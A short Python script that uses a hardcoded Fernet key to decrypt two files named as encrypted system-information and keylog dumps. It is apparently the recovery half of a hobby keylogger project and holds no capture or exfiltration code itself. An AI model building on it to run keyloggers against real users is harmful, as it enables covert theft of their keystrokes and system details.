#this decrypts the files
from cryptography.fernet import Fernet

key = "m6wOmergiho1Ay8egx8wR98qqYHsK7ZU9LFpq-hgajo="

sys_information_e = "e_sysinfo.txt"
keys_information_e = "e_keylog.txt" 

encrypted_files = [sys_information_e, keys_information_e]
count = 0

for decrypted_file in encrypted_files:
    #read
    with open(encrypted_files[count], 'rb') as f: #open files in binary
        data = f.read()

    #decrypt
    fernet = Fernet(key)
    decrypted = fernet.decrypt(data) #decrypting data w/ Fernet
    
    #append
    with open (encrypted_files[count], 'wb') as f: #appending decrypted data, writing binary
        f.write(decrypted) #writing decrypted data

    count+=1 #increasing count.. i know it's just 2 items for now